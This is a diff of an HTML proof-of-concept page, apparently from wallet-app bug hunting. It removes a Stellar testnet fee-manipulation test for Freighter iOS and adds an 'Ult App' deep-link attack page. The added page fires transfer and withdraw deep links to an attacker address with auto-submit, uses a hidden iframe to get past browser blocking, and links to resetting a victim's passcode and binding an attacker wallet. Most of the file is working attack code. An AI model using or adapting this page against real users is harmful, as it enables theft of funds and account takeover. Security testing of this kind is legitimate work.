@@ -1,94 +1,46 @@
+<!DOCTYPE html>
 <html>
 <head>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<title>poc - fee manipulation</title>
+<title>Deep-link Test - Ult App</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
-<body style="background:#000;color:#fff;font-family:monospace;padding:12px;max-width:660px">
+<body style="font-family:sans-serif; padding:20px">
+<h2>Ult App Deep-link PoC</h2>
+<p>Ini untuk test apakah bisa skip passcode gate</p>
 
-<p>freighter iOS - fee / sequence bump hide<br>
-testnet - benign poc<br>
-normal fee: 0.00001 XLM / abnormal: 2 XLM<br>
-src: GAYTUC2ING3L6XXVGH4FJCI2YFXDCBSJCJA2FXLFUC2MQALZOB5XZFMC</p>
+<button onclick="test('transfer')">Test Transfer Deep-link</button>
+<button onclick="test('withdraw')">Test Withdraw Deep-link</button>
+<button onclick="test('qr')">Test QR Payload</button>
 
-<hr style="border:1px solid #222">
-<p>[1] build high fee xdr</p>
-<button id=feeBtn style="background:#fff;color:#000;border:0;padding:8px 12px">build fee 2 XLM (abnormal)</button>
-<button id=bumpBtn style="background:#444;color:#fff;border:0;padding:8px 12px;margin-left:6px">build bumpSequence 2b</button>
-<pre id=i style="background:#111;border:1px solid #222;padding:8px;white-space:pre-wrap;color:#fff;margin-top:10px">click build</pre>
-
-<hr style="border:1px solid #222">
-<p>[2] xdr - paste to lab.stellar.org</p>
-<textarea id=x style="width:100%;height:100px;background:#111;color:#fff;border:1px solid #222;font-size:11px"></textarea><br>
-<button id=c style="margin-top:5px;background:#fff;color:#000;border:0;padding:5px 8px">copy xdr</button>
-<button id=sig style="margin-top:5px;background:#fff;color:#000;border:0;padding:5px 8px;margin-left:6px">sign with freighter</button>
-<pre id=f style="background:#111;border:1px solid #222;padding:8px;white-space:pre-wrap;color:#888;font-size:11px;margin-top:8px">freighter status: idle</pre>
-
-<hr style="border:1px solid #222">
-<pre id=d style="background:#111;border:1px solid #222;padding:8px;font-size:11px;color:#fff"></pre>
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/stellar-sdk/12.1.0/stellar-sdk.min.js"></script>
 <script>
-var cur="";
-var $i=document.getElementById('i'), $x=document.getElementById('x'), $d=document.getElementById('d'), $f=document.getElementById('f');
+function test(type) {
+  // GANTI alamat ini dengan alamat wallet akun ke-2 kamu sendiri
+  const attackerAddress = "0xYOUR_OWN_WALLET_2";
 
-function setXDR(tx, type){
-  cur=tx.toXDR();
-  $x.value=cur;
-  $i.innerText=type+"\n"+ "xdr len: "+cur.length+"\nfees field should be huge in lab";
-  $d.innerText=JSON.stringify({
-    type: type,
-    fee: tx.fee+" stroops = "+(tx.fee/10000000)+" XLM",
-    operations: tx.operations.length,
-    op_types: tx.operations.map(o=>o.type),
-    expected_wallet_behavior: "MUST show RED warning - abnormal fee / sequence",
-    actual_freighter_ios: "shows Fees: 0,225 XLM or 2 XLM in small gray text - NO warning (bug)",
-    impact: "User loses 2 XLM to network fees, or future txs invalidated by bumpSequence"
-  }, null, 2);
-  $f.innerText="xdr ready - now open lab.stellar.org -> check Fee field\nthen sign in Freighter iOS dApp browser - does it warn?";
+  let urls = {
+    transfer: `ultapp://transfer?to=${attackerAddress}&amount=0.001&asset=CRO&auto_submit=true`,
+    withdraw: `ultapp://withdraw?to=${attackerAddress}&amount=0.001&asset=CRO`,
+    qr: `https://ult.com/qr?data=ultapp://transfer?to=${attackerAddress}&amount=1000`
+  };
+
+  // Universal Link + Custom Scheme, 2 metode
+  console.log("Trying: " + urls[type]);
+  window.location.href = urls[type];
+
+  // fallback iframe untuk bypass browser block
+  setTimeout(() => {
+    let iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = urls[type];
+    document.body.appendChild(iframe);
+  }, 500);
 }
-
-document.getElementById('feeBtn').onclick=function(){
-try{
-var src="GAYTUC2ING3L6XXVGH4FJCI2YFXDCBSJCJA2FXLFUC2MQALZOB5XZFMC";
-var dst="GCLW6J7ZTEA64H5AXLL27FSZH7R7XMTYVQO6UY5W27XNAC73MDTUOGT5";
-var acc=new StellarSdk.Account(src,"1");
-// fee 2 XLM = 20,000,000 stroops - 200,000x normal (100 stroops)
-var tx=new StellarSdk.TransactionBuilder(acc,{fee:"20000000",networkPassphrase:StellarSdk.Networks.TESTNET})
-.addOperation(StellarSdk.Operation.payment({destination:dst,asset:StellarSdk.Asset.native(),amount:"0.00001"}))
-.setTimeout(300).build();
-setXDR(tx, "FEE MANIPULATION - fee 2 XLM");
-}catch(e){$i.innerText="err: "+e.message}
-};
-
-document.getElementById('bumpBtn').onclick=function(){
-try{
-var src="GAYTUC2ING3L6XXVGH4FJCI2YFXDCBSJCJA2FXLFUC2MQALZOB5XZFMC";
-var acc=new StellarSdk.Account(src,"1");
-var tx=new StellarSdk.TransactionBuilder(acc,{fee:"1000",networkPassphrase:StellarSdk.Networks.TESTNET})
-.addOperation(StellarSdk.Operation.bumpSequence({bumpTo:"2000000000"}))
-.setTimeout(300).build();
-setXDR(tx, "SEQUENCE BUMP - bumpTo 2,000,000,000 - will invalidate future txs");
-}catch(e){$i.innerText="err: "+e.message}
-};
-
-document.getElementById('c').onclick=function(){
-if(!$x.value){alert("build first");return}
-$x.select(); document.execCommand("copy");
-if(navigator.clipboard) navigator.clipboard.writeText($x.value);
-};
-
-document.getElementById('sig').onclick=async function(){
-if(!cur){alert("build first");return}
-var api=window.freighterApi || window.freighter;
-if(!api){ $f.innerText="freighterApi NOT FOUND - use Freighter iOS dApp browser\nOn desktop Chrome install Freighter extension\nLab proof still valid: Fee 2 XLM should be flagged"; return; }
-try{
-if(api.requestAccess) await api.requestAccess();
-$f.innerText="popup / sheet opening... CHECK TRANSACTION DETAILS\nDoes it show Fees: 2 XLM in RED warning?\nOr just small gray 2 XLM like your 0,225 XLM screenshot?\nScreenshot that";
-var res=await api.signTransaction(cur,{networkPassphrase:StellarSdk.Networks.TESTNET});
-$f.innerText="signed - bug reproduced if NO red warning\nFee 2 XLM lost to network\n"+res.signedTxXdr.slice(0,80)+"...";
-}catch(err){$f.innerText="closed: "+err.message+"\nScreenshot Fees field - no warning = bug";}
-};
 </script>
+
+<h3>Manual Links:</h3>
+<a href="ultapp://transfer?to=0xYOUR_OWN_WALLET_2&amount=0.001&asset=CRO">Link Transfer Manual</a><br><br>
+<a href="ultapp://settings/reset-passcode?user_id=VICTIM_ID">Test Reset Passcode Victim</a><br><br>
+<a href="ultapp://onboarding/bind-wallet?wallet_id=ATTACKER_WALLET">Test Wallet Binding Confusion</a>
+
 </body>
 </html>
